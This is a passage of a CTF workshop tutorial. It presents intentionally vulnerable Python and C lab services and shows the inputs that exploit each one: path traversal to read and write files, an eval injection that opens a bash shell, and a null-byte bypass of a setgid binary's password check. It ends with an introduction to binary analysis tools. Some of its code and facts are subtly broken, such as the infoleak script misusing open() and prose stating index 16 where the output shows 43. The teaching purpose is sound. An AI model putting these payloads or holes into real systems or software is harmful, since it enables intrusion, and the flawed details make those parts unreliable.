operating system. These vulnerabilities usually allow an attacker with local
access to the system to escalate their rights from a restricted user to root.

## 5. Illustration of Compromise in Target Python Applications

To make it easier to visualise and internalise these compromise goals, let us go
through a couple of examples in a high level script such as python where we try
to compromise a couple of remote services (where applicable).

### Denial of Service

To demonstrate this scalably, everyone will run an instance of the server on
their own shells. This means you should start up another terminal and log into
your shell again so you can play both the attacker and the attacked.

Please create the following python script:

```python
#!/usr/bin/python

import socket

def main():
    HOST, PORT = "localhost", 0

    # Create the server, binding to localhost on a free port
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(10)

    # Print the connection information
    print "Please connect to %s %d" % (HOST, server.getsockname()[1])

    # Activate the server; this will keep running until you
    # interrupt the program with Ctrl-C
    while True:
        # Accept a connection
        conn, addr = server.accept()

        # Interact with the client
        conn.sendall("Please enter the number you wish to square: ")

        # Get the integer
        data = conn.recv(1024)
        number = int(data)

        # Square it
        square = number * number

        # Print the number back to the client as a string
        conn.sendall(str(square) + "\n")

        # Close the connection
        conn.close()

if __name__ == "__main__":
    main()
```

Run it in your newly created terminal, note the connection information and
return to your first terminal.

```console
elliot@ctf101-shell:~/ctf101$ python denialofservice.py
Please connect to localhost 43065

```

Try interacting with the server normally.

```console
elliot@ctf101-shell:~/ctf101$ nc localhost 43065
Please enter the number you wish to square: 23
529
elliot@ctf101-shell:~/ctf101$
```

Do this a couple of times to convince yourself that the server will work for
multiple people. Now, let us deny others the service by attempting to crash the
script. What happens when we pass the server a letter instead of a number?

```console
elliot@ctf101-shell:~/ctf101$ nc localhost 43065
Please enter the number you wish to square: A
elliot@ctf101-shell:~/ctf101$ nc -v localhost 43065
nc: connect to localhost port 43065 (tcp) failed: Connection refused
elliot@ctf101-shell:~/ctf101$
```

Looks like the server is no longer accepting connections. If we check the
terminal where we ran the server we find that the script has terminated due to
an exception:

```console
elliot@ctf101-shell:~/ctf101$ python denialofservice.py
Please connect to localhost 43065
Traceback (most recent call last):
  File "denialofservice.py", line 39, in <module>
    main()
  File "denialofservice.py", line 27, in main
    number = int(data)
ValueError: invalid literal for int() with base 10: 'A\n'
elliot@ctf101-shell:~/ctf101$
```

This is a straightforward exercise demonstrating how a crash caused by bad input
by a user to the server has prevented other legitimate users from accessing the
service.

### Information Leakage

Information leaks are very interesting vulnerabilities that allow you to leak
what goes on under the hood of the program. Take a look at the following script:

```python
#!/usr/bin/python

import sys

FLAG = open("/home/infoleak/flag")
PUBLIC_DATA = "RainRainGoAwayComeAgainAnotherDay"

def write(data):
    sys.stdout.write(data)
    sys.stdout.flush()

def main():
    haystack = FLAG + PUBLIC_DATA
    write("Welcome to the Infoleak!\n")
    write("Please enter an index: ")

    index = len(FLAG) + int(sys.stdin.readline())
    write("Giving you the data from index %d...\n" % index)
    write("Here's the data: %s\n" % haystack[index:])


if __name__ == "__main__":
    main()
```

Can you spot the vulnerability? The service is running at `nc pwn.spro.ink
1338`. Let's try interacting with it.

```console
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
Welcome to the Infoleak!
Please enter an index: 0
Giving you the data from index 43...
Here's the data: RainRainGoAwayComeAgainAnotherDay
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
Welcome to the Infoleak!
Please enter an index: 10
Giving you the data from index 53...
Here's the data: AwayComeAgainAnotherDay
elliot@ctf101-shell:~/ctf101$
```

Now, certain things in the output should raise some red flags here. Notice how
when entering a zero index, we are given data from index 16. Now, looking back
at the source code, we can observe that the data comes from the 'haystack'
variable. This variable is a concatenation of the 'FLAG' and 'PUBLIC\_DATA' and
our supplied index is added to the length of 'FLAG' which means any 'legitimate'
value that we type will result in the calculated index landing within the 'safe'
public data.

You may not have recognised it, but our infoleak vulnerability occurs here:

```python
    index = len(FLAG) + int(sys.stdin.readline())
```

When supplying an index of zero, we can obtain the length of the flag. We'll use
this information later. Let's try to make the program behave in a non-intended
manner right now. Notice that the program is using int() to convert a string
into an integer. Most programming languages support inputs such as "1", "999",
and with some parameters, "4e3bc" but remember, negative integers are integers
too and are properly handled by these parsers. Let's see if it works:

```console
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
Welcome to the Infoleak!
Please enter an index: -2
Giving you the data from index 41...
Here's the data: }
RainRainGoAwayComeAgainAnotherDay
elliot@ctf101-shell:~/ctf101$
```

And it does! Supplying a negative integer will allow us to read data from the
non-public segment of the 'haystack'. It is just a matter of applying the
information of the flag length we obtained just now to get the entire flag.

```console
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
Welcome to the Infoleak!
Please enter an index: -43
Giving you the data from index 0...
Here's the data: ctf101{w3ll_1_gu355_th3y_4r3_fl0ating_n0w}
RainRainGoAwayComeAgainAnotherDay
elliot@ctf101-shell:~/ctf101$
```

### Arbitrary File Read

Arbitrary file reads allow you to read from any location that the owner of the
service has access to. Take a look at this vulnerable service:

```python
#!/usr/bin/python
# I might have left a little present at /flag

import sys

def write(data, term="\n"):
    sys.stdout.write(data + term)
    sys.stdout.flush()

def main():
    # Tell the user what we have
    write("Our selection: futurama, ghost, pinkfloyd, rat")
    write("Take your pick: ", term="")

    # What did they pick
    pick = sys.stdin.readline().strip()

    # Try reading the art
    try:
        location = "/home/arbitraryread/art/" + pick
        contents = open(location).read()
    except:
        write("Unable to read the art from file...")
        exit()

    # Give them the art
    write(contents)

if __name__ == "__main__":
    main()
```

The service is running at `nc pwn.spro.ink 1339`. Let's try interacting with it:

```console
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1339
Our selection: futurama, ghost, pinkfloyd, rat
Take your pick: pinkfloyd


                        ..uu.
                       ?$""`?i           z'
                       `M  .@"          x"
                       'Z :#"  .   .    f 8M
                       '&H?`  :$f U8   <  MP   x#'
                       d#`    XM  $5.  $  M' xM"
                     .!">     @  'f`$L:M  R.@!`
                    +`  >     R  X  "NXF  R"*L
                        k    'f  M   "$$ :E  5.
                        %    `~  "    `  'K  'M
                            .uH          'E   `h
                         .x*`             X     `
                      .uf`                *
                    .@8     .
                   'E9F  uf"          ,     ,
                     9h+"   $M    eH. 8b. .8    .....
                    .8`     $'   M 'E  `R;'   d?"""`"#
                   ` E      @    b  d   9R    ?*     @
                     >      K.zM `%M'   9'    Xf   .f
                    ;       R'          9     M  .=`
                    t                   M     Mx~
                    @                  lR    z"
                    @                  `   ;"
                                          `
                                 .u!"`
                             .x*"`
                         ..+"NP
                      .z""   ?
                    M#`      9     ,     ,
                             9 M  d! ,8P'
                             R X.:x' R'  ,
                             F F' M  R.d'
                             d P  @  E`  ,
                            P  '  P  N.d'
                           ''        '
                ss
                 X               x             .
                 9     .f       !         .    $b
                 4;    $k      /         dH    $f
                 'X   ;$$     z  .       MR   :$
                  R   M$$,   :  d9b      M'   tM
                  M:  #'$L  ;' M `8      X    MR
                  `$;t' $F  # X ,oR      t    Q;
                   $$@  R$ H :RP' $b     X    @'
                   9$E  @Bd' $'   ?X     ;    W
                   `M'  `$M d$    `E    ;.o* :R   ..
                    `    '  "'     '    @'   '$o*"'  -Philippe Chaintreuil

elliot@ctf101-shell:~/ctf101$
```

Basically, what it does is ask the user for a name to a file containing some
ascii art and displays the contents of the file to the user if the script is
able to retrieve it. The vulnerability exists on the following line since there
is no input validation to determine whether the filename the user provides is
legitimate or not.

```python
        location = "/home/arbitraryread/art/" + pick
        contents = open(location).read()
```

We can read the flag file at `/flag` by traversing upwards in the directory path
using `..` to get to root:

```console
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1339
Our selection: futurama, ghost, pinkfloyd, rat
Take your pick: ../../../../../../flag
ctf101{M3x1c4n_wr3stl3r_by_4dd13}

elliot@ctf101-shell:~/ctf101$
```

### Arbitrary File Write

The next one is a pretty involved one. With arbitrary file writes, many things
are possible. However, let's look at a scenario where we elevate our privileges
within the program using an arbitrary file write vulnerability. Here's the
script:

```python
#! /usr/bin/python

import sys

# global variables
logged_in = False
admin = False
FLAG = open("/home/arbitrarywrite/flag").read()

def write(data):
    sys.stdout.write(data)
    sys.stdout.flush()

def main():
    write("Secret Storage 1.0\n")
    while True:
        if not logged_in:
            # Print the menu
            write("You are not logged in. Please choose one option: \n")
            write("1. Log in\n")
            write("2. Create Account\n")

            # Read the choice
            choice = sys.stdin.readline().strip()

            # Read the username and password
            write("Please enter your name: ")
            name = sys.stdin.readline().strip()
            write("Please enter your password: ")
            password = sys.stdin.readline().strip()

            # Process the choices
            if choice == "1":
                if validate(name, password):
                    write("Success!\n")
                else:
                    write("Failure!\n")
            elif choice == "2":
                create_user(name, password)
            else:
                write("Invalid choice.\n")

        else:
            # Already logged in
            write("Welcome %s!\n" % logged_in)
            write("1. Retrieve secret\n")
            write("2. Store secret\n")
            write("3. Read admin secret\n")

            # Read the choice from the user
            choice = sys.stdin.readline().strip()

            # Process the choice
            if choice == "1":
                write("Which secret would you like to retrieve: ")
                secretname = sys.stdin.readline().strip()
                retrieve_secret(secretname)
            elif choice == "2":
                write("What is the name of the secret you want to store: ")
                secretname = sys.stdin.readline().strip()
                write("What secret would you like to store: ")
                secret = sys.stdin.readline().strip()
                store_secret(secretname, secret)
            elif choice == "3":
                reveal_secret()
            else:
                write("Invalid choice.\n")

# Retrieve the secrets from the file
def retrieve_secret(secretname):
    if "flag" in secretname:
        write("Privileged secret requires admin writes\n")
        return
    try:
        with open("/home/arbitrarywrite/secrets/%s" % (secretname)) \
            as secretfile:
            write("Here's your secret: %s\n" % secretfile.read())
    except:
        write("No such secret\n")

# Write secrets to file
def store_secret(secretname, secret):
    try:
        with open("/home/arbitrarywrite/secrets/%s" % (secretname), "w") \
            as secretfile:
            secretfile.write(secret)
            write("Secret written!\n")
    except:
        write("Error in writing secret.\n")

# Reveal the secrets if the user is logged in and admin
def reveal_secret():
    if admin:
        write("Here is the admin's secret: %s\n" % FLAG)
    else:
        write("You are not admin.\n")

# Validate the username and password
def validate(name, password):
    try:
        with open("/home/arbitrarywrite/accounts/" + name) as accountfile:
            adminflag, filepassword = accountfile.read().split(":")
            if password == filepassword:
                global logged_in
                logged_in = name
                if adminflag == "1":
                    global admin
                    admin = True
                return True
    except:
        write("No such account.\n")
    return False

# Create users by writing them to file
def create_user(name, password):
    with open("/home/arbitrarywrite/accounts/" + name, "w") as accountfile:
        accountfile.write("0:" + password)
    write("Account created. Please log in.\n")

if __name__ == "__main__":
    main()
```

Let's go through a legitimate run to get a feel of what is going on.

```console
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1340
Secret Storage 1.0
You are not logged in. Please choose one option:
1. Log in
2. Create Account
2
Please enter your name: elliot
Please enter your password: alderson
Account created. Please log in.
You are not logged in. Please choose one option:
1. Log in
2. Create Account
1
Please enter your name: elliot
Please enter your password: alderson
Success!
Welcome elliot!
1. Retrieve secret
2. Store secret
3. Read admin secret
2
What is the name of the secret you want to store: mrrobot
What secret would you like to store: CONTROL
Secret written!
Welcome elliot!
1. Retrieve secret
2. Store secret
3. Read admin secret
1
Which secret would you like to retrieve: mrrobot
Here's your secret: CONTROL
Welcome elliot!
1. Retrieve secret
2. Store secret
3. Read admin secret
3
You are not admin.
Welcome elliot!
1. Retrieve secret
2. Store secret
3. Read admin secret
^C
elliot@ctf101-shell:~/ctf101$
```

Looks like we can create accounts, store secrets, and retrieve them. However, we
are not allowed to read the admin secret. We have to have admin privileges for
that. Let's go back to the source code and see how they determine that. There is
a `validate` function that checks if the username and password is correct:

```python
# Validate the username and password
def validate(name, password):
    try:
        with open("/home/arbitrarywrite/accounts/" + name) as accountfile:
            adminflag, filepassword = accountfile.read().split(":")
            if password == filepassword:
                global logged_in
                logged_in = name
                if adminflag == "1":
                    global admin
                    admin = True
                return True
    except:
        write("No such account.\n")
    return False
```

The `admin` variable is set if the `adminflag` is 1. It also looks as if all of
the account information is located in a directory called `accounts`. We can look
at the registration function `create_user` to figure out the format the user
accounts are stored in:

```python
# Create users by writing them to file
def create_user(name, password):
    with open("/home/arbitrarywrite/accounts/" + name, "w") as accountfile:
        accountfile.write("0:" + password)
    write("Account created. Please log in.\n")
```

Looks like new accounts are created with the username as the filename and
contains a string in the format of `0:<password>` with the 0 denoting non-admin.
If we can create our own account file with a 1 in place of that 0, we can obtain
admin rights. If we look at how secrets are stored, we can see that there is an
arbitrary write vulnerability in the `store_secret` function:

```python
# Write secrets to file
def store_secret(secretname, secret):
    try:
        with open("/home/arbitrarywrite/secrets/%s" % (secretname), "w") \
            as secretfile:
            secretfile.write(secret)
            write("Secret written!\n")
    except:
        write("Error in writing secret.\n")
```

Since we can reuse that directory traversal trick, we can go up one directory,
down the accounts directory and create a file of our choosing. We can leverage
this to store a secret with the contents `1:password` and a controlled filename
to create our admin user. The attack looks like this:

```console
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1340
Secret Storage 1.0
You are not logged in. Please choose one option:
1. Log in
2. Create Account
1
Please enter your name: elliot
Please enter your password: alderson
Success!
Welcome elliot!
1. Retrieve secret
2. Store secret
3. Read admin secret
2
What is the name of the secret you want to store: ../accounts/mrrobot
What secret would you like to store: 1:mrrobot
Secret written!
Welcome elliot!
1. Retrieve secret
2. Store secret
3. Read admin secret
^C
elliot@ctf101-shell:~/ctf101$
```

Now, we can log in with our new admin account and read the admin secret:

```console
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1340
Secret Storage 1.0
You are not logged in. Please choose one option:
1. Log in
2. Create Account
1
Please enter your name: mrrobot
Please enter your password: mrrobot
Success!
Welcome mrrobot!
1. Retrieve secret
2. Store secret
3. Read admin secret
3
Here is the admin's secret: ctf101{1ts_3am_1_w4nt_m4cd0nalds}

Welcome mrrobot!
1. Retrieve secret
2. Store secret
3. Read admin secret
```

### Remote Code Execution

Itching to pop a shell yet? In this practical example, you'll finally get to.
Take a look at the following code:

```python
#! /usr/bin/python

import sys

def write(data):
    sys.stdout.write(data)
    sys.stdout.flush()

def main():
    write("SuperCalculator (e.g. 2+2): ")
    eqn = sys.stdin.readline().strip()
    answer = eval(eqn)
    write("%s = %s\n" % (eqn, answer))

if __name__ == "__main__":
    main()
```

Let's see what it does when you interact with it legitimately.

```
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1341
SuperCalculator (e.g. 2+2): 4+4
4+4 = 8
elliot@ctf101-shell:~/ctf101$
```

Seems like it is a simple calculator. But let's take a look at a particularly
suspicious line:

```python
    answer = eval(eqn)
```

Now, whenever a script uses an evaluate statement over user supplied input an
exploitable bug is bound to be discovered within. In this case, arbitrary python
code can be written as payload to spawn a remote shell. However, we have to be
very careful to write it as one line due to the nature of the code. Try to get a
usable shell!

There are multiple solutions, but here is one:

```console
$ python codeexec.py
SuperCalculator (e.g. 2+2): __import__("os").system("bash")
$
```

### Privilege Escalation

For the last category, let's try something different. Here's a little taster as
an introduction to the later sections.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int check(char *user_pass, char *pass) {
    int index = 0;
    while (user_pass[index] != 0) {
        if (user_pass[index] != pass[index]) {
            return 0;
        }
        index++;
    }
    return 1;
}

int main(int argc, char *argv[]) {
    char user_pass[256];
    printf("Password: ");
    scanf("%255s", user_pass);
    if (check(user_pass, "XXXXXXXXXXXXXXXXXXXXXXXX")) {
        printf("Win!\n");
        execl("/bin/sh", "/bin/sh", "-p", NULL);
    }
    else {
        printf("Fail!\n");
    }
}
```

The password in the source code is redacted, of course. You don't need it to log
in when there's a vulnerability in the code.

The service is running at `ssh -p 1342 escalate@pwn.spro.ink`. Login with the
password `escalate`. Here's a sample run:

```console
elliot@ctf101-shell:~/ctf101$ ssh -p 1342 escalate@pwn.spro.ink
The authenticity of host '[pwn.spro.ink]:1342 ([188.166.246.7]:1342)' can't be
established.
ECDSA key fingerprint is SHA256:SJgGuvu30lYSzLjwdwsqsxpmkIZiw8y49e/iN5MMHug.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[pwn.spro.ink]:1342,[188.166.246.7]:1342' (ECDSA) to
the list of known hosts.
escalate@pwn.spro.ink's password:
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-34-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls -la
total 36
drwxr-xr-x  2 root privesca 4096 Aug 19 22:08 .
drwxr-xr-x 11 root root     4096 Aug 19 22:08 ..
-rwxr-x---  1 root privesca  220 Aug 31  2015 .bash_logout
-rwxr-x---  1 root privesca 3771 Aug 31  2015 .bashrc
-rwxr-x---  1 root privesca  655 Jun 24 15:44 .profile
-rwxr-sr-x  1 root privesca 8776 Aug 19 22:03 escalate
-r--r-----  1 root privesca   30 Aug 19 22:04 flag
$ ./escalate
Password: idk
Fail!
$
```

If you look closely, the escalate binary is a setgid binary. This means that
when run, the process adopts the privileges of the group that owns it. If we
somehow managed to take control of the process, we would effectively be able to
act with the privileges of that group. Which is incidentally what we need to
read that flag file.

The idea is to leverage a vulnerability in the way the program validates the
password. Look at these lines of code:

```c
    while (user_pass[index] != 0) {
        if (user_pass[index] != pass[index]) {
            return 0;
        }
```

Notice that the loop runs for as long as it receives no null bytes. If the
function returns zero, it means that the password was invalid. Otherwise, the
password is valid. This means that if we can avoid the entire loop altogether,
we can bypass the authentication completely. To do this, we simply provide a
string starting with a null byte to immediately halt the loop. We shall use some
python for this.

```console
$ python -c 'print "\x00"' | ./escalate
Password: Win!
$ id
uid=1001(escalate) gid=1001(escalate) groups=1001(escalate)
$
```

Notice that it says we have successfully authenticated which should have given
us a real nice elevated shell. However, notice that no extra privileges are
conferred yet. This is because the streams are closed. To get around this, we
use `cat` on `stdin` as our 'bridge'.

```console
$ (python -c 'print "\x00"'; cat -) | ./escalate
Password: Win!
id
uid=1001(escalate) gid=1001(escalate) egid=1000(privesca)
groups=1000(privesca),1001(escalate)
ls -la
total 36
drwxr-xr-x  2 root privesca 4096 Aug 19 22:08 .
drwxr-xr-x 11 root root     4096 Aug 19 22:08 ..
-rwxr-x---  1 root privesca  220 Aug 31  2015 .bash_logout
-rwxr-x---  1 root privesca 3771 Aug 31  2015 .bashrc
-rwxr-x---  1 root privesca  655 Jun 24 15:44 .profile
-rwxr-sr-x  1 root privesca 8776 Aug 19 22:03 escalate
-r--r-----  1 root privesca   30 Aug 19 22:04 flag
cat flag
ctf101{s0m3th1ng_4b0ut_kr34y}
^C
$
```

Notice now that we have the `privesca` group privilege and are now able to read
the flag.

## 6. C and x86-64 Assembly

A quick introduction to writing, compiling, and disassembling binaries from C
code.

### Compiling C

To create the binaries, we need to go through the write, compile, execute cycle.
First, create the following C file as `sample.c`:

```c
#include <stdio.h>

int main(int argc, char * argv[]) {
    char * mystring = "This is a string";
    printf("I am going to print: %s.\n", mystring);
}
```

We can compile this using the GNU C Compiler, or `gcc` for short, to create 64
bit ELF x64 binaries. The syntax is simple:

```console
elliot@ctf101-shell:~/ctf101$ gcc -o sample sample.c
elliot@ctf101-shell:~/ctf101$
```

Now we can run the program with the following syntax:

```console
elliot@ctf101-shell:~/ctf101$ ./sample
I am going to print: This is a string.
elliot@ctf101-shell:~/ctf101$
```

Try compiling the following code with the filename `demotools.c`:

```c
int main(int argc, char ** argv) {
    printf(argv[1]);
    say_hello();
}

void say_hello() {
    char * ihateeveryone = "Goaway!\n";
    char * iloveveryone = "Helloo!\n";
    if (strcmp(ihateeveryone, iloveveryone) == 0) {
        printf(ihateeveryone);
    }
    printf(iloveveryone);
}
```

Notice that this time, there are a lot of warnings and complaints from the
compiler since not-so-great practices are used in this example. However, it
successfully compiles. While there aren't any vulnerabilities in this example,
its illustrative of how easy it is to ignore issues when actually developing in
C.

```console
elliot@ctf101-shell:~/ctf101$ gcc -o demotools demotools.c
demotools.c: In function ‘main’:
demotools.c:2:5: warning: implicit declaration of function ‘printf’
[-Wimplicit-function-declaration]
     printf(argv[1]);
     ^
demotools.c:2:5: warning: incompatible implicit declaration of built-in function
‘printf’
demotools.c:2:5: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
demotools.c:2:5: warning: format not a string literal and no format arguments
[-Wformat-security]
demotools.c:3:5: warning: implicit declaration of function ‘say_hello’
[-Wimplicit-function-declaration]
     say_hello();
     ^
demotools.c: At top level:
demotools.c:6:6: warning: conflicting types for ‘say_hello’
 void say_hello() {
      ^
demotools.c:3:5: note: previous implicit declaration of ‘say_hello’ was here
     say_hello();
     ^
demotools.c: In function ‘say_hello’:
demotools.c:9:9: warning: implicit declaration of function ‘strcmp’
[-Wimplicit-function-declaration]
     if (strcmp(ihateeveryone, iloveveryone) == 0) {
         ^
demotools.c:10:9: warning: incompatible implicit declaration of built-in
function ‘printf’
         printf(ihateeveryone);
         ^
demotools.c:10:9: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
demotools.c:10:9: warning: format not a string literal and no format arguments
[-Wformat-security]
demotools.c:12:5: warning: incompatible implicit declaration of built-in
function ‘printf’
     printf(iloveveryone);
     ^
demotools.c:12:5: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
demotools.c:12:5: warning: format not a string literal and no format arguments
[-Wformat-security]
elliot@ctf101-shell:~/ctf101$
```

### Binary Tools

We will use this new binary we have to demonstrate some tools for binary
analysis.

#### nm

nm is a tool from GNU binutils that lists the symbols from an object or binary
file.

```console
elliot@ctf101-shell:~/ctf101$ nm demotools
0000000000601040 B __bss_start
0000000000601040 b completed.7585
0000000000601030 D __data_start
0000000000601030 W data_start
00000000004004a0 t deregister_tm_clones
0000000000400520 t __do_global_dtors_aux
0000000000600e18 t __do_global_dtors_aux_fini_array_entry
0000000000601038 D __dso_handle
0000000000600e28 d _DYNAMIC
0000000000601040 D _edata
0000000000601048 B _end
0000000000400674 T _fini
0000000000400540 t frame_dummy
0000000000600e10 t __frame_dummy_init_array_entry
00000000004007e8 r __FRAME_END__
0000000000601000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
0000000000400698 r __GNU_EH_FRAME_HDR
0000000000400400 T _init
0000000000600e18 t __init_array_end
0000000000600e10 t __init_array_start
0000000000400680 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000600e20 d __JCR_END__
0000000000600e20 d __JCR_LIST__
                 w _Jv_RegisterClasses
0000000000400670 T __libc_csu_fini
0000000000400600 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
0000000000400566 T main
                 U printf@@GLIBC_2.2.5
00000000004004e0 t register_tm_clones
000000000040059e T say_hello
0000000000400470 T _start
                 U strcmp@@GLIBC_2.2.5
0000000000601040 D __TMC_END__
elliot@ctf101-shell:~/ctf101$
```

The letters mean some pretty important things. D for example, means that that
symbols resides with the data section, T, the text or code section, R means
read-only data, etc. Check the manual page for a full description of all the
flags.

Now, these symbols aren't always included in the binaries (usually they are
stripped in CTFs) but when they are, they're really useful for reversing.

#### ltrace

ltrace is a really cool GNU binutils tool that lets you trace library cools
during the program's execution.

```console
elliot@ctf101-shell:~/ctf101$ ltrace ./demotools
__libc_start_main(0x400566, 1, 0x7ffe1865a388, 0x400600 <unfinished ...>
printf(nil)                                                                 = -1
strcmp("Goaway!\n", "Helloo!\n")                                            = -1
printf("Helloo!\n"Helloo!
)                                                                           = 8
+++ exited (status 0) +++
elliot@ctf101-shell:~/ctf101$
```

Notice that the `stdout` of the program mixes with the output of the ltrace
execution trace. You can avoid that by redirecting `stdout` to `/dev/null`

```console
elliot@ctf101-shell:~/ctf101$ ltrace ./demotools 1>/dev/null
__libc_start_main(0x400566, 1, 0x7ffcc78f6bb8, 0x400600 <unfinished ...>
printf(nil)                                                                 = -1
strcmp("Goaway!\n", "Helloo!\n")                                            = -1
printf("Helloo!\n")                                                         = 8
+++ exited (status 0) +++
elliot@ctf101-shell:~/ctf101$
```

#### strace

Likewise, strace lets you trace system calls and signals during the program's
execution.

```console
elliot@ctf101-shell:~/ctf101$ strace ./demotools
execve("./demotools", ["./demotools"], [/* 29 vars */]) = 0
brk(NULL)                               = 0x1f69000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f70f51a8000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=24756, ...}) = 0
mmap(NULL, 24756, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f70f51a1000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\t\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1864888, ...}) = 0
mmap(NULL, 3967488, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f70f4bbc000
mprotect(0x7f70f4d7c000, 2093056, PROT_NONE) = 0
mmap(0x7f70f4f7b000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bf000) = 0x7f70f4f7b000
mmap(0x7f70f4f81000, 14848, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f70f4f81000
close(3)                                = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f70f51a0000
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f70f519f000
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f70f519e000
arch_prctl(ARCH_SET_FS, 0x7f70f519f700) = 0
mprotect(0x7f70f4f7b000, 16384, PROT_READ) = 0
mprotect(0x600000, 4096, PROT_READ)     = 0
mprotect(0x7f70f51aa000, 4096, PROT_READ) = 0
munmap(0x7f70f51a1000, 24756)           = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
brk(NULL)                               = 0x1f69000
brk(0x1f8a000)                          = 0x1f8a000
write(1, "Helloo!\n", 8Helloo!
)                = 8
exit_group(0)                           = ?
+++ exited with 0 +++
elliot@ctf101-shell:~/ctf101$
```

#### GDB

We will cover this in greater depth a little later in the workshop but here's a
little teaser:

```console
elliot@ctf101-shell:~/ctf101$ gdb demotools
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from demotools...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/elliot/ctf101/demotools
Helloo!
[Inferior 1 (process 7301) exited normally]
(gdb)
```

#### objdump

objdump is actually the swiss army knife of extracting information from a
binary. You can do a whole lot of things with it, but for now, let's just do a
disassembly.

```console
elliot@ctf101-shell:~/ctf101$ objdump -d demotools

demotools:     file format elf64-x86-64


Disassembly of section .init:

0000000000400400 <_init>:
  400400:       48 83 ec 08             sub    $0x8,%rsp
  400404:       48 8b 05 ed 0b 20 00    mov    0x200bed(%rip),%rax        # 600ff8 <_DYNAMIC+0x1d0>
  40040b:       48 85 c0                test   %rax,%rax
  40040e:       74 05                   je     400415 <_init+0x15>
  400410:       e8 4b 00 00 00          callq  400460 <strcmp@plt+0x10>
  400415:       48 83 c4 08             add    $0x8,%rsp
  400419:       c3                      retq

Disassembly of section .plt:

0000000000400420 <printf@plt-0x10>:
  400420:       ff 35 e2 0b 20 00       pushq  0x200be2(%rip)        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400426:       ff 25 e4 0b 20 00       jmpq   *0x200be4(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40042c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000400430 <printf@plt>:
  400430:       ff 25 e2 0b 20 00       jmpq   *0x200be2(%rip)        # 601018 <_GLOBAL_OFFSET_TABLE_+0x18>
  400436:       68 00 00 00 00          pushq  $0x0
  40043b:       e9 e0 ff ff ff          jmpq   400420 <_init+0x20>

0000000000400440 <__libc_start_main@plt>:
  400440:       ff 25 da 0b 20 00       jmpq   *0x200bda(%rip)        # 601020 <_GLOBAL_OFFSET_TABLE_+0x20>
  400446:       68 01 00 00 00          pushq  $0x1
  40044b:       e9 d0 ff ff ff          jmpq   400420 <_init+0x20>

0000000000400450 <strcmp@plt>:
  400450:       ff 25 d2 0b 20 00       jmpq   *0x200bd2(%rip)        # 601028 <_GLOBAL_OFFSET_TABLE_+0x28>
  400456:       68 02 00 00 00          pushq  $0x2
